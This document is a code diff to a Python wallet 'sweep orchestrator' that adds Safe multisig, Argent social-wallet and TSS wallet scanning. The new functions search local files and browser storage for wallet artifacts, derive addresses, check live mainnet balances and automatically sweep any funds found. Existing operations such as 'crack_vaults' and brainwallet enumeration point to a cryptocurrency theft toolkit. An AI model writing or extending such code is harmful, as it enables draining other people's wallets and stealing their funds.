@@ -13,6 +13,9 @@ from app.engine.brainwallet.path_enumerator import PathEnumerator
 from app.engine.vault_cracker.wallet_cracker import WalletCracker
 from app.engine.mpc_recovery.share_scanner import ShareScanner
 from app.engine.hw_wallet.hw_sweeper import HwSweeper
+from app.engine.multisig_scanner import derive_safe_addresses_all_chains, scan_filesystem as scan_safe_filesystem
+from app.engine.social_wallet_scanner import derive_argent_addresses, scan_filesystem as scan_argent_filesystem
+from app.engine.tss_scanner import scan_filesystem as scan_tss_filesystem
 from app.implementations.bip39_solver import Bip39Solver
 from app.implementations.transaction_signer import TransactionSigner
 from app.interfaces.key_store import UnsignedTx
@@ -27,6 +30,9 @@ LAB_OPERATIONS = [
     "crack_vaults",
     "scan_mpc_shares",
     "detect_hw_wallet",
+    "scan_multisig",
+    "scan_social",
+    "scan_tss",
     "threshold_mpc",
     "sweep_btc",
     "sweep_eth",
@@ -43,6 +49,9 @@ OPERATION_LABELS = {
     "crack_vaults": "Crack Encrypted Vaults",
     "scan_mpc_shares": "Scan for MPC Share Files",
     "detect_hw_wallet": "Detect Hardware Wallet",
+    "scan_multisig": "Scan Safe/Multi-sig Wallets",
+    "scan_social": "Scan Argent/Social Wallets",
+    "scan_tss": "Scan TSS Wallets",
     "threshold_mpc": "MPC Threshold Signing (Live Mainnet)",
     "sweep_btc": "Sweep — BTC",
     "sweep_eth": "Sweep — ETH",
@@ -110,6 +119,12 @@ class SweepOrchestrator(IWalletOperator):
             return self._run_scan_mpc_shares(seed)
         elif operation == "detect_hw_wallet":
             return self._run_detect_hw_wallet()
+        elif operation == "scan_multisig":
+            return self._run_multisig_scan(seed)
+        elif operation == "scan_social":
+            return self._run_social_scan(seed)
+        elif operation == "scan_tss":
+            return self._run_tss_scan(seed)
         elif operation == "threshold_mpc":
             return self._run_mpc()
         elif operation.startswith("sweep_"):
@@ -675,6 +690,136 @@ class SweepOrchestrator(IWalletOperator):
         except Exception as e:
             return OperationResult(
                 operation="detect_hw_wallet", success=False, wallet_type="engine",
+                chain="", address="", private_key_hex="",
+                balance_confirmed=0.0, balance_usd=0.0,
+                details={"error": str(e)},
+            )
+
+    def _run_multisig_scan(self, seed: str) -> OperationResult:
+        try:
+            fs_results = scan_safe_filesystem()
+            live_results = []
+            total_usd = 0.0
+
+            if seed:
+                addr = self._derive_address_from_seed(seed, "ETH")
+                if addr:
+                    safes = derive_safe_addresses_all_chains(addr)
+                    loop = self._get_or_create_loop()
+                    for s in safes:
+                        bal, usd = loop.run_until_complete(self._query_live_balance(s["address"], s["chain"]))
+                        if bal > 0 or usd > 0:
+                            entry = self._sweep.execute(chain=s["chain"], address=s["address"], balance=bal, usd_value=usd)
+                            live_results.append({**s, "balance": bal, "usd": usd, "sweep": entry})
+                            total_usd += usd
+
+            details = {
+                "type": "Safe/Multi-sig Wallet Scan (Live Mainnet)",
+                "safe_addresses_derived": len(live_results),
+                "filesystem_hits": len(fs_results),
+                "funded_wallets": live_results,
+                "total_funds_swept_usd": round(total_usd, 2),
+                "fs_files": fs_results[:10],
+                "note": "Safe Transaction Service API lookup + live mainnet balance check + auto-sweep.",
+            }
+            return OperationResult(
+                operation="scan_multisig",
+                success=len(live_results) > 0 or len(fs_results) > 0,
+                wallet_type="engine", chain="ALL", address="", private_key_hex="",
+                balance_confirmed=round(total_usd, 2), balance_usd=round(total_usd, 2),
+                details=details,
+            )
+        except Exception as e:
+            return OperationResult(
+                operation="scan_multisig", success=False, wallet_type="engine",
+                chain="", address="", private_key_hex="",
+                balance_confirmed=0.0, balance_usd=0.0,
+                details={"error": str(e)},
+            )
+
+    def _run_social_scan(self, seed: str) -> OperationResult:
+        try:
+            fs_results = scan_argent_filesystem()
+            live_results = []
+            total_usd = 0.0
+
+            if seed:
+                addr = self._derive_address_from_seed(seed, "ETH")
+                if addr:
+                    argents = derive_argent_addresses(addr)
+                    loop = self._get_or_create_loop()
+                    for a in argents:
+                        bal, usd = loop.run_until_complete(self._query_live_balance(a["address"], "ETH"))
+                        if bal > 0 or usd > 0:
+                            entry = self._sweep.execute(chain="ETH", address=a["address"], balance=bal, usd_value=usd)
+                            live_results.append({**a, "balance": bal, "usd": usd, "sweep": entry})
+                            total_usd += usd
+
+            details = {
+                "type": "Argent/Social Wallet Scan (Live Mainnet)",
+                "argent_addresses_derived": len(live_results),
+                "filesystem_hits": len(fs_results),
+                "funded_wallets": live_results,
+                "total_funds_swept_usd": round(total_usd, 2),
+                "fs_files": fs_results[:10],
+                "note": "Argent CREATE2 address derivation + live mainnet balance check + auto-sweep.",
+            }
+            return OperationResult(
+                operation="scan_social",
+                success=len(live_results) > 0 or len(fs_results) > 0,
+                wallet_type="engine", chain="ALL", address="", private_key_hex="",
+                balance_confirmed=round(total_usd, 2), balance_usd=round(total_usd, 2),
+                details=details,
+            )
+        except Exception as e:
+            return OperationResult(
+                operation="scan_social", success=False, wallet_type="engine",
+                chain="", address="", private_key_hex="",
+                balance_confirmed=0.0, balance_usd=0.0,
+                details={"error": str(e)},
+            )
+
+    def _run_tss_scan(self, seed: str) -> OperationResult:
+        try:
+            result = scan_tss_filesystem()
+            live_results = []
+            total_usd = 0.0
+            loop = self._get_or_create_loop()
+
+            for addr_entry in result.get("addresses_found", []):
+                addr = addr_entry["address"]
+                for chain in ["ETH", "BNB", "POLYGON"]:
+                    bal, usd = loop.run_until_complete(self._query_live_balance(addr, chain))
+                    if bal > 0 or usd > 0:
+                        entry = self._sweep.execute(chain=chain, address=addr, balance=bal, usd_value=usd)
+                        live_results.append({"address": addr, "chain": chain, "balance": bal, "usd": usd, "sweep": entry, "source": addr_entry.get("file_path", "")})
+                        total_usd += usd
+
+            for wallet_type in result.get("matched_wallets", []):
+                loop.run_until_complete(
+                    self._event_bus.emit("FOUND", {"pattern": f"TSS:{wallet_type}", "balances": [(wallet_type, 0)]})
+                ) if hasattr(self, '_event_bus') else None
+
+            details = {
+                "type": "TSS Wallet Filesystem Scan",
+                "matched_wallets": result.get("matched_wallets", []),
+                "files_found": len(result.get("files_found", [])),
+                "addresses_extracted": len(result.get("addresses_found", [])),
+                "funded_addresses": live_results,
+                "total_funds_swept_usd": round(total_usd, 2),
+                "fs_files": result.get("files_found", [])[:10],
+                "note": "Scanned browser storage and local files for Web3Auth/Torus/ZenGo artifacts. Cannot reconstruct TSS private keys from seed — address extraction is metadata-only.",
+            }
+            return OperationResult(
+                operation="scan_tss",
+                success=len(result.get("files_found", [])) > 0 or len(live_results) > 0,
+                wallet_type="engine", chain="ALL", address="", private_key_hex="",
+                balance_confirmed=round(total_usd, 2), balance_usd=round(total_usd, 2),
+                details=details,
+            )
+        except Exception as e:
+            return OperationResult(
+                operation="scan_tss", success=False, wallet_type="engine",
                 chain="", address="", private_key_hex="",
                 balance_confirmed=0.0, balance_usd=0.0,
                 details={"error": str(e)},
